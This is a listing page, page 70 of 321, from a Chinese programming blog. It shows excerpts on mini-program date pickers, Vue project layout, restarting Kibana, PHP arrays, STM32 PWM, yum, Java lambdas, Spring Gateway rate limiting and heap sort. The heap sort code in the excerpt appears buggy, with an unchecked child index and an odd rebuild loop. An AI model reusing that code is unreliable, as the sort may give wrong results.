// 选择预约日期 onDisplay() { this.setData({ show: true }); }, onClose() { this.setData({ show: false }); }, formatDate(date) { date = new Date(date); let str = `${date.getFullYear()}-${date.getMonth() + 1}/${date.getDate()}`; console.log(str); this.setData({ time:str }); }, onConfirm(event) { this.setData({ show: false, date: this.formatDate(event.detail), }); }, 如图所示，时间只能选一天：
二、当选择两个时间点时 wxml：
&lt;van-cell title="选择预约时间" value="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/127c0add6b8b97d27a873404494a1e20/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1826d68e558e08e25324a2cb8057e10/" rel="bookmark">
			解读新创建vue项目的各个目录的作用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当你使用 vue create 命令创建一个新的 Vue 项目时，会自动生成一些基础目录和文件，它们的作用如下：
node_modules: 存储项目的依赖包，包括开发依赖和运行依赖。
public: 存储应用程序的静态 HTML、CSS、JS 等资源。
favicon.ico: 应用程序的浏览器标签页图标。
index.html: 应用程序的主 HTML 文件。
src: 存储应用程序的源代码和资源文件。
assets: 存储应用程序的静态资源，例如图片、字体等。
components: 存储应用程序的可重用组件。
views: 存储应用程序的视图组件，每个视图组件对应一个路由地址。
App.vue: 应用程序的根组件。所有其他组件的容器，定义了应用程序的布局和结构
main.js: 应用程序的入口文件，初始化 Vue 实例并配置路由、状态等。
router.js: 应用程序的路由配置文件，定义页面路由和对应的组件。
babel.config.js: 应用程序的 Babel 配置文件，用于将 ES6+ 代码转换为 ES5 代码。
package.json: 应用程序的依赖和配置文件，定义了项目的版本、脚本、依赖等信息。
package-lock.json: 应用程序的依赖管理文件，锁定依赖包的版本号，保持版本的一致性。
在实际项目开发中，你可以根据需求对这些目录和文件进行合理的组织，例如新建一个 api 目录存放接口请求相关的代码，或者新建一个 store 目录存放状态管理相关的代码。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30517f81c05bd09f3e9d226264a00073/" rel="bookmark">
			Elasticsearch 入门到精通-ES可视化查询工具kibana重启
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ps -ef|grep kibana
ps -ef|grep 5601
都找不到
尝试 使用 fuser -n tcp 5601
kill -9 端口
ps -ef|grep node 或 netstat -anltp|grep 5601
启动即可 ./kibana
后台启动：nohup …/bin/kibana &amp;
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9d2d33756012911893f6df255bffea1/" rel="bookmark">
			基于java&#43;swing实现点餐系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		java+swing实现的B2B点餐系统（多对多关系） 1. 用户模块 1. 登录，注册，找回密码 2. 用户首页 3.店铺页面（点菜模块，评论模块，购物车模块） 4. 我的订单（确定订单模块，我的订单，订单点评，查看订单状态） 5. 个人信息（修改个人信息，修改密码） 2. 商家模块 1. 菜单模块（新增菜品，菜品信息修改） 2. 订单模块（确认订单，确认派送，正在派送，历史订单） 3. 个人信息模块（修改商家个人信息，修改密码） 3. 获取源码 麻烦给up主动点赞+关注+收藏谢谢~
源码连接：https://www.123pan.com/s/iMyeVv-DehoH.html提取码:6666
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b210c59521feaaaaf9aa6b8c067c89b1/" rel="bookmark">
			windows安装cmake快速教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、下载cmake cmake官网直直接下载速度都很慢，可以到点击下载地址进行下载。
点击下载地址进去之后，可以看到有很多的版本，这里根据自己的需要选一个版本即可（建议不要选择太早的版本），我这里选择的3.22版本。
对于windows系统，一般选择x86_64.msi对应的文件下载即可。
2、安装cmake 点击下载好的文件进行安装即可。需要注意的是，在需要选择添加cmake路径，这样后续不用自己手动去添加路径，可以省却很多麻烦。
安装目录一般默认就好，当然也可以根据自己的需要选择其他目录。
3、判断是否安装成功 安装好cmake之后，打开命令行，输入cmake --version，如果显示了对应的版本，说明安装成功。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05603518bc6d7baa85429772e7a134b9/" rel="bookmark">
			PHP高级教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PHP 多维数组 PHP 表单完成PHP 日期 在本教程之前的章节中，我们已经知道数组是一种数/值对的简单列表。
不过，有时您希望用一个以上的键存储值。
可以用多维数组进行存储。
PHP - 多维数组 多维数组指的是包含一个或多个数组的数组。
PHP 能理解两、三、四或五级甚至更多级的多维数组。不过，超过三级深的数组对于大多数人难于管理。
注释：数组的维度指示您需要选择元素的索引数。
对于二维数组，您需要两个索引来选取元素对于三维数组，您需要三个索引来选取元素 PHP - 两维数组 两维数组是数组的数组（三维数组是数组的数组的数组）。
首先，让我们看看下面的表格：
我们能够在两维数组中存储上表中的数据，就像这样：
$cars = array ( array("Volvo",22,18), array("BMW",15,13), array("Saab",5,2), array("Land Rover",17,15) ); 现在这个两维数组包含了四个数组，并且它有两个索引（下标）：行和列。
如需访问 $cars 数组中的元素，我们必须使用两个索引（行和列）：
实例 &lt;?php echo $cars[0][0].": 库存：".$cars[0][1].", 销量：".$cars[0][2].".&lt;br&gt;"; echo $cars[1][0].": 库存：".$cars[1][1].", 销量：".$cars[1][2].".&lt;br&gt;"; echo $cars[2][0].": 库存：".$cars[2][1].", 销量：".$cars[2][2].".&lt;br&gt;"; echo $cars[3][0].": 库存：".$cars[3][1].", 销量：".$cars[3][2].".&lt;br&gt;"; ?&gt; 我们也可以在 For 循环中使用另一个 For 循环，来获得 $cars 数组中的元素（我们仍需使用两个索引）：
实例 &lt;?php for ($row = 0; $row &lt; 4; $row++) { echo "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/05603518bc6d7baa85429772e7a134b9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8ec0658c535f439b0acd0178f8089a9/" rel="bookmark">
			STM32 PWM
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		OC（Output Compare）输出比较
输出比较可以通过比较CNT与CCR寄存器值的关系，来对输出电平进行置1、置0或翻转的操作，用于输出一定频率和占空比的PWM波形。（CCR是我们给定的值,当CNT大于、小于/等于CCR时，进行翻转）
每个高级定时器和通用定时器都拥有4个输出比较通道
高级定时器的前3个通道额外拥有死区生成和互补输出的功能
PWM简介 PWM（Pulse Width Modulation）脉冲宽度调制
在具有惯性的系统中，可以通过对一系列脉冲的宽度进行调制，来等效地获得所需要的模拟参量，常应用于电机控速等领域
PWM参数：
频率 = 1 / TS 占空比 = TON / TS 分辨率 = 占空比变化步距
分辨率是以占空比的变化值的变量名，例如从1%、2、3%等就是以1%的的步距跳变，分辨率就是1%
模式
描述
冻结
CNT=CCR时，REF保持为原状态
匹配时置有效电平
CNT=CCR时，REF置有效电平
匹配时置无效电平
CNT=CCR时，REF置无效电平
匹配时电平翻转
CNT=CCR时，REF电平翻转
强制为无效电平
CNT与CCR无效，REF强制为无效电平
强制为有效电平
CNT与CCR无效，REF强制为有效电平
PWM模式1
向上计数：CNT&lt;CCR时，REF置有效电平，CNT≥CCR时，REF置无效电平
向下计数：CNT&gt;CCR时，REF置无效电平，CNT≤CCR时，REF置有效电平
PWM模式2
向上计数：CNT&lt;CCR时，REF置无效电平，CNT≥CCR时，REF置有效电平
向下计数：CNT&gt;CCR时，REF置有效电平，CNT≤CCR时，REF置无效电平
PSC是预分频器的时钟，CCR是设定的比较值，ARR是计数器最大溢出值
舵机简介
上述的值代入PWM公式满足要求，20K对应20ms
有此对应关系：
20K=20ms X=需要的高电平宽度 求出X，X就是CCR的值
也可推出输出指定角度的公式有：Angle/180*2000+500
PWM.c
#include "stm32f10x.h" // Device header void PWM_Init(void) { RCC_APB1PeriphClockCmd(RCC_APB1Periph_TIM2,ENABLE);//选择TIM2定时器 RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA,ENABLE); GPIO_InitTypeDef GPIO_InitStructure; GPIO_InitStructure.GPIO_Mode=GPIO_Mode_AF_PP;//需要复用推挽输出，因为此程序是CH1输出，是片上外设 GPIO_InitStructure.GPIO_Pin=GPIO_Pin_1;//根据GPIO引脚定义，此程序用的是OC2通道，对应的是CH2，由引脚图可知选PA1 GPIO_InitStructure.GPIO_Speed=GPIO_Speed_50MHz; GPIO_Init(GPIOA,&amp;GPIO_InitStructure); TIM_InternalClockConfig(TIM2);//由内部时钟驱动 TIM_TimeBaseInitTypeDef TIM_TimeBaseInitStructure; TIM_TimeBaseInitStructure.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d8ec0658c535f439b0acd0178f8089a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd116d7ead36cacaa2acf67512e5ae17/" rel="bookmark">
			yum的安装和使用（包含安装过程中遇到的问题及解决方法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		天行健，君子以自强不息；地势坤，君子以厚德载物。
每个人都有惰性，但不断学习是好好生活的根本，共勉！
文章均为学习整理笔记，分享记录为主，如有错误请指正，共同学习进步。
文章目录 介绍yum的安装1. 更新安装包资源2. 安装build-essential3. 安装yum3.1 问题一："E：无法定位软件包 yum"3.1.1 备份3.1.2 本机版本3.1.3 资源寻找3.1.4 更新 3.2 问题二：签名问题3.2.1 公钥配置3.2.2 更新 3.3 问题三：软件包依赖关系问题3.4 再次安装yum 4. 检查yum版本 yum的使用1. 安装软件2. 删除/卸载3. 更新4. 升级5. 清空软件包缓存 介绍 yum全称为Yellow dog Updater Modified
是一个Shell前端软件包管理器，主要针对与Fedora/RedHat/SUSE
它的作用就是自动处理依赖关系，一次安装所有相关性依赖的软件包，不用一个一个下载安装。
它基于RPM包管理，从指定服务器中下载安装软件包。
可以使用yum进行软件包的查找、安装、卸载等一系列操作。
yum的基础语法：yum[options][command][package_name]
方括号中的参数为可选
options:
-h ：help 帮助-y ：yes安装提示，使用-y可省略输入Y确认-q ：不显示安装过程 command：
操作命令 package：
安装包名 写在前面：
Linux系统中分为两系: 一是Debian系，包括了Debian、Ubuntu、Deepin、Mint 一是Redhat系，包括RHEL、Fedora、CentOS Debian系用apt包管理器 Redhat系用yum包管理器 所以正常来说Ubuntu上直接使用apt命令就可以，不需要安装yum，不过非要使用yum也是可以安装使用的。 yum的安装 安装之前先说一下自己走的弯路，首先系统服务器可以通过putty等工具来连接的，可以更方便的进行窗口命令的操作
然而我在安装yum时却忽略了这一点，直接在Linux桌面终端窗口中进行操作的，这也就遇到了后面的无法复制粘贴内容进去。
请先安装putty连接服务器后在putty窗口中进行操作，可直接复制粘贴内容。
putty下载
putty安装
通常输入命令yum，如果没有找到，则表示没有安装yum，如下
此时需要安装yum
1. 更新安装包资源 sudo apt-get update （这里应该显示的是默认的资源配置，以上显示是在我已经换过清华源配置文件资源后的内容）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cd116d7ead36cacaa2acf67512e5ae17/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f82ce30e401b192ea4047166f316fe0/" rel="bookmark">
			java8函数式编程(Lambda表达式，Optional，Stream流)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		java8函数式编程(Lambda表达式，Optional，Stream流,时间日期api)
文章目录 1.概述2.lambda表达式2.2代码 3.Stream流3.1概述3.2案例数据准备3.2.1实现 3.3常用操作3.3.1流的创建3.3.2中间操作**filter****map****distinct****sorted****skip**flatMap 3.3.3终结操作forEachcountmax，mincollect查找与匹配reduce归并 4.Optional4.1概述ofNullableofOptional.empty() 4.2安全消费4.3获取值4.4安全获取值4.5过滤4.6判断4.7数据流转换 5.函数接口5.1概念5.2常见函数式接口常用的默认方法 6.方法引用6.1推荐方法6.2基本格式6.3 语法详细(了解)6.3.1 引用静态方法6.3.2 引用对象的实例方法6.3.3 引用类的实例方法6.3.4构造器引用 7.高级用法8.并行流9.时间API9.1本地日期时间LocalDate、LocalTime、LocalDateTime---&gt;类似于Calender9.2 Instant:瞬时---&gt;类似Date9.3 DateTimeFormatter-----&gt;类似SimpleDateFormat 总结 1.概述 Lambda表达式，也可称为闭包，是JDK8的新特性。Lambda 允许把函数作为一个方法的参数（函数作为参数传递进方法中），可以使代码变的更加简洁紧凑。Lambda表达式是一个可传递的代码块，可以在以后执行一次或多次。
名字起源是以前还没有计算机时，逻辑学家Alonzo Church想要形式化的表示能有效计算的数学函数，使用了希腊字母lambda（λ ）来标记参数，从那以后，带参数变量的表达式就被称为lambda表达式。
2.lambda表达式 #### 2.1省略原则 参数类型可以省略方法体只有一句代码时大括号return和唯一一句代码的分号可以省略方法只要一个参数时小括号可以省 2.2代码 package com.example.lambda; import java.util.function.Function; import java.util.function.IntBinaryOperator; import java.util.function.IntPredicate; public class Lambda_1 { public static void main(String[] args) { new Thread(()-&gt;{ System.out.println("今天天气真好"+Thread.currentThread().getName()); }).start(); new Thread(()-&gt;{ System.out.println("今天天气真好"+Thread.currentThread().getName()); }).start(); //接口是函数表达式（接口中只定义了一个抽象方法） //匿名内部类 int i=calculateNum((left, right) -&gt; left+right); System.out.println(i); //函数表达式 int ii=calculateNum((int left,int right)-&gt;{ return left*right; }); System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3f82ce30e401b192ea4047166f316fe0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dad419bc276e2a0a45ee9f73c618fd73/" rel="bookmark">
			微信小程序实现订阅消息功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		* 源码已经上传到资源处，需要的话点击跳转下载 | 源码下载
小程序中的订阅内容在日常中大家都会使用到，一般在支付的时候，会收到支持成功的消息，里面有一些基础信息花费多少以及是使用在什么地方，订阅消息是小程序向用户发送消息的方式，小程序本身是不具备接收消息功能，而是通过微信的服务通知功能将消息转达给用户的。下面来简单看一下：
以上大致知道了订阅消息的这个功能，这里需要客户端和服务器端两者，本篇就来使用客户端，且在客户端中来模拟服务器端，那么在下一篇会使用Node.js搭载的服务器作为服务端。
完成效果 下面来看一下完成的效果：
在未获取用户信息之前无法进入界面，在获取之后进入操作界面，日志类型默认是日报，可以点击选择周报或月报，点击日期选择可以挑选对应的日期，需要填写提醒人，温馨提示默认是这个尚未提交日志，下面还有一个提示，需要填写提醒人名称，当点击提醒人名称时会获取用户订阅消息的权限，填写完提醒人发送按钮也会从禁用转成启用状态，点击发送就可以在微信上的服务通知可以看到会有这个未提交日志提醒的通知了，下面就来开始实现：
订阅消息相关参数 参数准备
appid(用户标识)，appSecret(app密钥)，template_id (订阅模板id)
登录 微信公众平台 (qq.com) 进入之后，在左侧菜单找到【开发管理】
现在来获取第三个订阅模板，在左侧菜单的【订阅消息】处，点击【选用】，然后搜一下【未提交日志】
然后点击【选用】 ，会出现以下这个
回到【订阅消息】的界面，在【我的模板】中可以找到，打开【详情】，里面就有这个模板id
页面编写 对页面编写的内容同样也不多说，点击按钮获取到数据就更新状态，通过wx:if或者wx:else来进行显示和隐藏，这里的样式也需要大家自己写了，页面也是比较简单的，还是着重在如何来实现订阅消息这块。
&lt;!-- index.html --&gt; &lt;!-- 顶部 --&gt; &lt;view class="content"&gt; &lt;view class="head"&gt; 当前操作员：{{admin}} &lt;/view&gt; &lt;block wx:if="{{!hasUserInfo}}"&gt; &lt;button bindtap="getUserProfile"&gt;获取&lt;/button&gt; &lt;/block&gt; &lt;block wx:else&gt; &lt;form bindsubmit="formSubmit"&gt; &lt;view class="log"&gt; &lt;view class="log_title"&gt; &lt;text&gt;日志类型&lt;/text&gt; &lt;picker bindchange="changeTitle" name="title" value="{{index}}" range="{{logArray}}"&gt; &lt;view class="nowing"&gt;{{logArray[index]}}&lt;/view&gt; &lt;/picker&gt; &lt;/view&gt; &lt;view class="log_date"&gt; &lt;text&gt;日期选择&lt;/text&gt; &lt;picker mode="date" name="date" value="{{date}}" bindchange="bindDateChange"&gt; &lt;view class="nowing"&gt;{{date}}&lt;/view&gt; &lt;/picker&gt; &lt;/view&gt; &lt;view class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dad419bc276e2a0a45ee9f73c618fd73/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e12c621c6d7bc5c320782aa36e48569/" rel="bookmark">
			一文速通 spring-cloud-starter-gateway &#43; redis实现限制IP访问次数已达到限流和防恶意刷请求的效果
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面，如果项目同时存在spring-cloud-starter-gateway依赖和spring-boot-starter-web依赖，会导致过滤器等配置发送冲突导致项目启动失败。所以使用时候，要把spring-boot-starter-web依赖去掉或者禁用！！！
一、pom文件导入依赖 &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt; &lt;version&gt;3.1.6&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis-reactive&lt;/artifactId&gt; &lt;/dependency&gt; 二、YML文件 spring: main: web-application-type: reactive #web-application-type: servlet #使用的时候，二选一 cloud: Spring Cloud Gateway 配置项，对应 GatewayProperties 类 gateway: discovery: locator: enabled: true # 路由配置项，对应 RouteDefinition 数组 routes: - id: rate_limiter # 唯一的路由编号 uri: localhost:8080/ # 路由到的目标地址 predicates: # 断言，作为路由的匹配条件，对应 RouteDefinition 数组 - Path=/** # - After=2017-01-20T17:42:47.789-07:00[America/Denver] filters: - name: RequestRateLimiter args: key-resolver: "#{@ipKeyResolver}" # 获取限流 KEY 的 Bean 的名字 redis-rate-limiter.replenishRate: 100 # 令牌桶的每秒放的数量 redis-rate-limiter.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7e12c621c6d7bc5c320782aa36e48569/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5dcf4d2c1f751cdb74510a18b2e49073/" rel="bookmark">
			MarkdownQuote：简化 Markdown 中的代码引用！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MarkdownQuote：简化 Markdown 中的代码引用！ 这是 SourceCodeTrace 项目之一，通过在 IDE 中提供一种便捷的方式，快速复制包含代码来源 Markdown 代码块。
SourceCodeTrace Project 帮助您在博客、文章记录的过程中，引入对应项目以及版本，行号等信息，让后续的读者，通过引用来源，能够进行更加深入的学习，在博客或文章中引入代码块时，尽量提供代码的来源信息。
您是否厌倦了在 Markdown 文档中手动格式化代码块？MarkdownQuote 可以帮您节省不少麻烦！这个强大的 JetBrains 插件让代码引用变得轻而易举，让您专注于撰写优秀的内容。
为什么选择 MarkdownQuote？ 安装简便：只需在 Jetbrains IDE 插件搜索中搜索 “MarkdownQuote”。点击几下鼠标，您就能轻松安装 MarkdownQuote。它支持所有 IDE 版本大于 193，确保与您喜欢的 Jetbrains IDE 兼容。
灵活的模板：MarkdownQuote 提供可自定义的模板，以满足您独特的需求。您可以轻松更改模板，按照自己的喜好进行调整。
快捷方便：使用 MarkdownQuote，引用代码只需右键单击！选择 “Markdown Quote…”，即可获得所需的代码块格式。
如何获取 MarkdownQuote 您可以从多个来源获取 MarkdownQuote：
Jetbrains 插件仓库：访问 Jetbrains 插件仓库上的官方 MarkdownQuote 页面，然后点击 “Install” 将其添加到您的 IDE 中。
GitHub：如果您更喜欢 GitHub 的方式，您可以在 https://github.com/10cl/MarkdownQuote 找到 MarkdownQuote 的代码仓库。
Jetbrains 市场：如果您已经有 MarkdownQuote.jar 文件，您可以直接从本地路径安装它。
如何使用 MarkdownQuote 选择模板：从设置菜单中选择所需的模板，或者根据变量自定义模板。
引用代码片段：右键单击所需的代码片段。
复制和粘贴：MarkdownQuote 将生成正确格式的代码块。只需复制并粘贴到您的 Markdown 文档中。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5dcf4d2c1f751cdb74510a18b2e49073/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b0147ba17a3c3b2f50eed69976d4a8e/" rel="bookmark">
			堆排序必知重要点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、完整堆排序代码
2、为什么要从 length/2-1处开始构建
3、堆调整过程中为什么还需要循环
本文就不讲述堆排序的概念了，只讲2个重点，理清楚了这两个重点，才算真正理解了堆排序。
1、完整堆排序代码 public static void main(String[] args) { int[] nums = {7,8,2,9,3,1,90,88,33}; heapSort(nums); for (int i = 0; i &lt; nums.length; i++) { System.out.println(nums[i]); } } public static void heapSort(int[] nums){ int length = nums.length; //从这里开始构造大顶堆 int start = length/2-1; //构造大顶堆 for (int i = start;i&gt;=0;i--) { heapAdjust(nums,i,length); } //重新构造大顶堆 for (int i = length; i &gt;=3; i--) { swap(nums,0,i-1); heapAdjust(nums,0,i-1); } //最后剩第0个和第1个元素 if (nums[0] &gt; nums[1]){ swap(nums,0,1); } } public static void heapAdjust(int[] nums,int start,int length){ if (length == 2){ return; } int k = 2 * start + 1; if (nums[k + 1] &gt; nums[k]){ k++; } if (nums[k] &gt; nums[start]){ //交换 swap(nums,start,k); //交换之后需要重新构建 for (int i = 2 * start + 1; i &lt; length/2-1; i++) { heapAdjust(nums,i,length); } } } public static void swap(int[] nums,int i,int j){ int temp = nums[i]; nums[i] = nums[j]; nums[j] = temp; } 2、为什么要从 length/2-1处开始构建 因为对于一个完全二叉树来说，length/2-1 所对应的节点是 倒数第二层，从右往左 第一个非叶子节点。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6b0147ba17a3c3b2f50eed69976d4a8e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/545122bcff294fe601c4699e6f60ae3b/" rel="bookmark">
			C# IO FileStream流（一）使用整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、C# IO 文件流，常用操作整理
来自其他开发者的整理：
文件操作常用相关类
1)Directory //操作目录（文件夹），静态类。2)Path//静态类，对文件或目录的路径进行操作（很方便）【字符串】3)File //操作文件,静态类，对文件整体操作。拷贝、删除、剪切等。4)DriveInfo //获取磁盘中的驱动器信息5)DirectoryInfo //文件夹的一个“类”，用来描述一个文件夹对象（获取指定目录下的所有目录时返回一个DirectoryInfo数组。）6)FileInfo//文件类，用来描述一个文件对象。获取指定目录下的所有文件时，返回一个FileInfo数组。 1.Stream//文件流，抽象类。2.FileStream//文件流,MemoryStream(内存流),NetworkStream(网络流)3.StreamReader//快速读取文本文件4.StreamWriter//快速写入文本文件 二、其他
更多：
C# IO Stream 流（三）基类整理 C# IO Stream 流（二）扩展类_封装器 C# IO Stream 流（一）基础概念_基本定义 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/69/">«</a>
	<span class="pagination__item pagination__item--current">70/321</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/71/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>